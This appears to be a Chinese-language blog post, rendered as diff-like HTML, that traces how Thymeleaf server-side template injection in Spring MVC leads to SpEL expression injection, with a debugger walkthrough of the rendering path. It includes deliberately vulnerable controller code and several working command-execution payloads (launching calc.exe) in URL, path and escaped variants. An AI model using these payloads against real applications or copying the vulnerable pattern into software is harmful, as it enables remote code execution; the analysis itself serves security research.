+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index::&quot;</span>+payload;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果是GET注入点，需要URL编码，不然Tomcat高版本（9.x）会报RFC错误（有<code>&amp;_</code>这种字符）</p>
+<p>理论上payload都能用以下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%<span class="number">22</span>).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>除此以外，还有一个特别的，注入点在URL path，用@PathVariable接收参数</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/vuln/&#123;payload&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@PathVariable</span> String payload)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>这里以如下Controller和payload做测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> payload+<span class="string">&quot;::unsafe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
+
+<p>Spring MVC 采用 <strong>前端控制器（DispatcherServlet）</strong> 作为核心组件，它负责接收请求、调用相应的 <code>Controller</code> 处理业务逻辑，并最终通过 <strong>视图解析器（ViewResolver）</strong> 渲染视图。</p>
+<h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><p><code>HandlerAdapter</code>对于执行流程的通用性起到了非常重要的作用，它能把任何一个<code>Handler（注意是Object类型）</code>都适配成一个<code>HandlerAdapter</code>，从而可以做统一的流程处理。具体的流程如下：</p>
+<p>1、请求首先进入DispatcherServlet， 由DispatcherServlet  从HandlerMappings中匹配对应的Handler，此时只是获取到了对应的Handler，然后拿着这个Handler去寻找对应的适配器，即：HandlerAdapter；</p>
 <p>2、拿到对应HandlerAdapter时，这时候开始调用对应的Handler方法，即执行我们的Controller来处理业务逻辑了， 执行完成之后返回一个ModeAndView；</p>
 <p>3、HandlerAdapter执行完之后，返回一个ModeAndView，把它交给我们的视图解析器ViewResolver，通过视图名称查找出对应的视图然后返回；</p>
 <p>4、最后，渲染视图 返回渲染后的视图。</p>
-<p>但是上面的问题仍然没有得到解答，为什么中间要插入一个HandleAdapter的流程？你会发现去掉这个封装代码仍然可用</p>
-<h2 id="注册Controller"><a href="#注册Controller" class="headerlink" title="注册Controller"></a>注册Controller</h2><p>为什么我上面这么强调一定？</p>
-<p>handlerMappings内只有两项，分别是RequestMappingHandlerMapping和BeanNameUrlHandlerMapping</p>
-<p>handlerAdapaters内只有RequestMappingHandlerAdapter、HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter三个适配器</p>
-<p>BeanNameUrlHandlerMapping、HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter为什么没有用到？</p>
-<p>首先，在分析createBean spring的自动装配时提到：</p>
-<p>我们分析一下@Controller注解是怎么将类注册进spring的</p>
-<p>Spring Controller 本质上是一个 <strong>Spring Bean</strong>。</p>
-<p>在 Spring MVC 中，<code>@Controller</code> 或 <code>@RestController</code> 标注的类会被 Spring 作为 <strong>组件（Bean）</strong> 进行管理。它们通常会被 Spring 的 <strong>组件扫描（Component Scanning）</strong> 机制自动注册为 Spring 容器中的 Bean。</p>
-<p>在 Spring 框架中，<code>@Controller</code> 本质上是 <code>@Component</code> 的一个特殊化注解：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310101443302.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310101443302.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310101443302"></p>
-<p>其他 Spring 组件（如 <code>@Service</code> 和 <code>@Repository</code>）也一样，都会被自动扫描并注册到 Spring 容器中。</p>
-<blockquote>
-<p>Spring 主要依赖以下两种方式进行组件扫描：</p>
+<p>从代码上来说，DispatcherServlet.doDispatch完成了整个请求分发和视图渲染的逻辑，1部分具体分析可见<a href="https://godownio.github.io/2025/03/25/spring-dispatcherservlet-xiang-jie/">https://godownio.github.io/2025/03/25/spring-dispatcherservlet-xiang-jie/</a></p>
+<p>其实该分析总结来说就是Controller接口具有视图渲染功能，HttpRequestHandler接口却没有。这里留了一个问题，RestController有没有视图渲染功能？</p>
+<p>这里我们从3开始调代码</p>
+<h3 id="实例化ModeAndView"><a href="#实例化ModeAndView" class="headerlink" title="实例化ModeAndView"></a>实例化ModeAndView</h3><p>看到DispatcherServlet.doDispatch，获取完HandlerAdapter后，调用其handle方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170059218.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170059218.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425170059218"></p>
+<p>一直跟进，直到ServletInvocableHandlerMethod#invokeAndHandler方法，该方法内先后调用了invokeForRequest和this.returnValueHandlers.handleReturnValue。其他代码不用看</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170624057.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170624057.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425170624057"></p>
+<p>跟进到InvokecableHandlerMethod#invokeForRequest。先是调用getMethodArgumentValues获取了参数，然后调用doInvoke。不用跟进也知道doInvoke是调用Controller去处理请求</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170922391.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170922391.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425170922391"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172441344.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172441344.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425172441344"></p>
+<p>事实证明正是在doInvoke处完成了Controller的处理</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172559496.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172559496.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425172559496"></p>
+<p>doInvoke的值返回后赋值给returnValue，可以看到是String格式</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172717066.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172717066.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425172717066"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172907583.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172907583.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425172907583"></p>
+<p>然后是调用this.returnValueHandlers.handleReturnValue，这里用getReturnValueType对returnValue处理了一下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425173218965.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425173218965.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425173218965"></p>
+<p>跟进getReturnValueType，发现是用ReturnValueMethodParameter做了封装</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425174327055.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425174327055.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425174327055"></p>
+<p>即传入handleReturnValue方法的第二个参数returnType如下，用ReturnValueMethodParameter封装的对象：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425174542483.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425174542483.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425174542483"></p>
+<p>跟进到handleReturnValue，先调用selectHandler，然后用调用其返回值的handleReturnValue方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425175618491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425175618491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425175618491"></p>
+<p>selectHandler里面有个循环，首先判断是否异步(恒为false)，然后循环调用supportsReturnType查看returnValueHandlers有没有匹配returnType的handler</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425175806732.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425175806732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250425175806732"></p>
+<p>returnValueHandlers如下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427151930673.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427151930673.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427151930673"></p>
+<p>这里马后炮来看，取到的是ViewNameMethodReturnValueHandler</p>
+<p>如果返回为空或者为字符串，就会满足ViewNameMethodReturnValueHandler.supportReturnType</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427152250462.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427152250462.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427152250462"></p>
+<p>继续跟进到这个handler的handleReturnValue方法，把传入的参数设置为视图名</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427152627669.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427152627669.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427152627669"></p>
+<p>注意设置为视图名非常关键，因为后面Thymeleaf渲染就会取视图名去解析</p>
+<p>后续跟进getModelAndView，可以看到实例化ModelAndView，传的参数就是上面的ViewName！</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427155912218.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427155912218.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427155912218"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427155939553.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427155939553.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427155939553"></p>
+<p>说明下面就会进行渲染！</p>
+<p>如果把注解从Controller换成RestController呢？</p>
+<p>handler变成了RequestResponseBodyMethodProcessor</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427164752107.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427164752107.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427164752107"></p>
+<p>RequestResponseBodyMethodProcessor.supportsReturnType判断Controller有没有被ResponseBody注解修饰</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165039188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165039188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427165039188"></p>
+<p>很明显Controller没有被ResponseBody注解修饰，而RestController被修饰了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165030703.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165030703.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427165030703"></p>
+<p>进入到RequestResponseBodyMethodProcessor.handleReturnValue，可以发现并没有设置viewName，而是createInputMessage和createOutputMessage</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165506100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165506100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427165506100"></p>
+<p>跟进一下发现直接从servletRequest读，写也是不用渲染直接写回servletResponse</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427172141627.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427172141627.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427172141627"></p>
+<p>其实RestController是用来直接返回json、xml等数据的，用于一些api的开发</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427172117600.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427172117600.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427172117600"></p>
+<p>所以懂了吧，RestController注解的不会触发SSTI漏洞，同时Controller注解上加ResponseBody也不会触发SSTI漏洞</p>
+<h3 id="applyDefaultViewName-URL-SSTI"><a href="#applyDefaultViewName-URL-SSTI" class="headerlink" title="applyDefaultViewName URL SSTI"></a>applyDefaultViewName URL SSTI</h3><p>回到doDispatch，handle完成了以上介绍的交给Controller处理、取出参数作为viewName这两个主要功能。接着调用applyDefaultViewName</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427175655299.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427175655299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427175655299"></p>
+<p>跟进到applyDefaultViewName，这里判断了viewName是否为空，如果为空则调用getDefaultViewName获取默认的viewName</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180353073.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180353073.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427180353073"></p>
+<p>我们静态看一下，getDefaultViewName怎么获取的。</p>
+<p>进到了另一个getViewName</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180531626.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180531626.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427180531626"></p>
+<p>getViewName会调用transformPath处理path</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427225122131.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427225122131.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427225122131"></p>
+<p>跟进到transformPath，第三个if负责分离掉文件后缀</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427225148644.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427225148644.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427225148644"></p>
+<p>这就是URL类型的 SSTI需要加<code>.x</code>的原因，如果不加，则前一个点就会被当作路径分隔符，payload就会完全坏掉）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln3/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%<span class="number">22</span>).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
+
+
+
+<p>持续跟进，得知此处就是把URL做viewName</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180759207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180759207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427180759207"></p>
+<p>这里实际上也是第三种payload（如下）的原因。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/vuln/&#123;payload&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@PathVariable</span> String payload)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="processDispatchResult：SSTI-sink"><a href="#processDispatchResult：SSTI-sink" class="headerlink" title="processDispatchResult：SSTI sink"></a>processDispatchResult：SSTI sink</h3><p>我们经过了handle和applyDefaultViewName，终于来到了最后的视图渲染部分，也是SSTI最后触发的sink点：processDispatchResult</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427181047959.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427181047959.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427181047959"></p>
+<p>processDispatchResult调用了render方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427213410957.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427213410957.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427213410957"></p>
+<p>在render方法内，先是调用getViewName获取viewName，然后调用resolveViewName解析</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427213521910.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427213521910.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427213521910"></p>
+<p>resolveViewName循环viewResolvers去解析</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214145547.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214145547.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427214145547"></p>
+<p>viewResolvers如下：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214247572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214247572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427214247572"></p>
+<p>这里选到的是ThymeleafViewResolver，具体怎么选的这里不深入探析</p>
+<p>后续就是跟进到ThymeleafView.render，调用了renderFragment</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214804129.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214804129.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427214804129"></p>
+<p>继续跟进，先判断viewTemplateName是否包含<code>::</code>，如果包含就用<code>~&#123;&#125;</code>包裹，并用parser.parseExpression去解析</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215035392.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215035392.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427215035392"></p>
+<p>这里viewTemplateName如下，也就是我们的payload经过Controller return的值</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215133965.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215133965.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427215133965"></p>
+<p>然后经过如下栈，跟进到StandardExpressionPreprocessor.preprocess</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215521553.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215521553.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427215521553"></p>
+<p>这个函数先是定义了一个matcher正则匹配器，然后去嵌套的解析input</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427220504291"></p>
+<p>这个正则正是匹配input两边的双下划线<code>__</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220727698.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220727698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427220727698"></p>
+<p>看代码很容易看出来，把正则匹配到的前面部分，也就是<code>&#123;</code>加到strBuilder，尾巴加到remaining，中间的部分调用expression.execute解析，这里就触发spEL表达式注入漏洞了</p>
+<p>完整的触发spEL的栈如下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427221202001.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427221202001.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427221202001"></p>
+<p>其实这完全可以说是一个spEL表达式注入漏洞</p>
+<p>我们进一步查看该图里的checkPreprocessingMarkUnescaping，由于代码很长，我直接说它的作用，就是寻找字符串是否含特定的结构 <code>\__</code>，如果有就换成<code>__</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427220504291"></p>
+<p>所以这个payload也是OK的（已测试）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=\__$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sink-2"><a href="#sink-2" class="headerlink" title="sink 2"></a>sink 2</h3><p>还是preprocess解析这里，为什么要把前面和尾巴部分保留，最后拼起来？我们可以清晰地看到，仍然保留了<code>~&#123;&#125;</code>的形式，难道说？还有二次解析？</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427220504291"></p>
+<p>猜对了，假如execute没有执行spEL表达式，以字符串形式返回了，会来到FragmentExpression.createExecutedFragmentExpression</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427223736497.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427223736497.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427223736497"></p>
+<p>依然会进行spEL解析</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427224015962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427224015962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250427224015962"></p>
+<p>没有双下划线的payload就是走的这个路径触发的漏洞</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream()).next()&#125;::.x</span><br></pre></td></tr></table></figure>
+
+<p>而且上面两个路径都是包含<code>::</code>就会触发漏洞，所以其实selector的部分可以省略：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream()).next()&#125;::</span><br></pre></td></tr></table></figure>
+
+<p>不过可惜，按照<code>~&#123;templatename::selector&#125;</code>格式，由于是先解析templatename，再解析selector，不然<code>::</code>可以放前面</p>
+<p>不过当然applyDefaultBiewName解析URL 触发SSTI是不能去掉<code>.x</code>的</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有一些文章会涉及到Thymeleaf SSTI回显，不过打入SpEL后目标默认回显错误页面。回显条件较多，意义不大</p>
